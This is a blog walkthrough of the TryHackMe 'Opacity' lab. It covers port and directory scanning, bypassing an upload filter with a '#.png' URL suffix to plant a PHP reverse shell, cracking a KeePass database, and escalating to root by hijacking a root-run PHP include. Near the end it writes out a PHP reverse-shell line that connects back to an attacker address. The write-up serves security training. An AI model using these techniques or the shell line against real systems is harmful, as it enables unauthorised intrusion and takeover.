---
title: "TryHackMe: Opacity"
collection: publications
permalink: /publication/Opacity
excerpt: 'This is a free machine from TryHackMe'
date: 2023-04-10
venue: '04-10'
#paperurl: 'http://academicpages.github.io/files/paper1.pdf'
#citation: 'Your Name, You. (2009). &quot;Paper Title Number 1.&quot; <i>Journal 1</i>. 1(1).'
---

![header](/images/opacity-header.png)

**LINK :** [Opacity](https://tryhackme.com/room/opacity)

---

## Enumeration : 

* Let's scan the target :

```bash
# nmap -sC -sV -T4 10.10.131.31
Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-10 12:22 EDT
Nmap scan report for 10.10.131.31
Host is up (0.095s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0f:ee:29:10:d9:8e:8c:53:e6:4d:e3:67:0c:6e:be:e3 (RSA)
|   256 95:42:cd:fc:71:27:99:39:2d:00:49:ad:1b:e4:cf:0e (ECDSA)
|_  256 ed:fe:9c:94:ca:9c:08:6f:f2:5c:a6:cf:4d:3c:8e:5b (ED25519)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-title: Login
|_Requested resource was login.php
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
* The scan reveals 4 open ports, i think that the SMB port was just a rabbit hole.

* Browsing to the web page i found this login page, i tried some sql injection payloads but it didn't work.

![opacity1](/images/opacity1.png)

* Let's see if we can find any hidden directories :

```bash
# gobuster dir -u http://10.10.131.31 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.131.31
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/04/10 12:23:51 Starting gobuster in directory enumeration mode
===============================================================
/css                  (Status: 301) [Size: 310] [--> http://10.10.131.31/css/]
/cloud                (Status: 301) [Size: 312] [--> http://10.10.131.31/cloud/]
```

* I found this */cloud* directory, so after i saw a file upload function the first thing comes to my mind is reverse shell

![opacity2](/images/opacity2.png)

* Let's start a web server on our local machine:

![opacity3](/images/opacity3.png)

>shell.php : https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

* So as you can see we can upload a file from an external URL, but unfortunately we can only upload images.

![opacity4](/images/opacity4.png)

* After i added .png to the URL, i was able to upload the file but i couldn't trigger the reverse shell.

![opacity5](/images/opacity5.png)

*  I spent a lot of time trying to bypass the file extension checks.

>https://book.hacktricks.xyz/pentesting-web/file-upload


* In order to bypass the restriction, you have to add #.png at the end of the URL.

![opacity6](/images/opacity6.png)

* Open the image and bingo you will receive the connection

![opacity7](/images/opacity7.png)

![opacity8](/images/opacity8.png)


## Horizontal Privilege Escalation :

* I found this interesting file in /opt

![opacity9](/images/opacity9.png)

> A KDBX file is a password database created by KeePass Password Safe.

* Let's start a web server and download the file to our local machine 

![opacity10](/images/opacity10.png)

![opacity11](/images/opacity11.png)

* We need a password to open this file, so let's crack the file using *keepass2john* and then *john*

![opacity12](/images/opacity12.png)

* Bingo we found the password.

![opacity13](/images/opacity13.png)

* Now let's open the file using *keepassxc*

```bash
# keepassxc dataset.kdbx
```
![opacity14](/images/opacity14.png)

* Enter the password.

![opacity16](/images/opacity16.png)

![opacity15](/images/opacity15.png)

* Let's login via ssh using this credentials and get the user flag.

![opacity17](/images/opacity17.png)

## Vertical Privilege Escalation :

* Let's see what processes are running on this machine using *pspy*

>https://github.com/DominicBreuker/pspy

* Open a web server on your local machine and then download the executable to the target machine

![opacity18](/images/opacity18.png)

![opacity19](/images/opacity19.png)

* After you run it, you will see a file called *script.php* is running

![opacity20](/images/opacity20.png)

* Let's read this file

![opacity21](/images/opacity21.png)

* The script requires a file called backup.inc.php this means it will call this file , then it backups all the files in /home/sysadmin/scripts to /var/backups/backup.zip


* As you can see the backup.inc.php is owned by root, so we can't modify it

![opacity22](/images/opacity22.png)

* You should notice that the sysadmin user have all the permissions to the *lib* folder

![opacity23](/images/opacity23.png)

* So the idea here is we're going to copy *backup.inc.php* to our home directory, now we can modify the file.

![opacity24](/images/opacity24.png)

* Let's add a php reverse shell


```bash
$sock=fsockopen("10.X.X.X",4444);exec("sh <&3 >&3 2>&3");
```

![opacity25](/images/opacity25.png)

* The next step is to remove the backup.inc.php from *script/lib/*, then move the modified file to *scripts/lib/*

![opacity26](/images/opacity26.png)

* Start a netcat listener and wait for the reverse shell.

![opacity27](/images/opacity27.png)

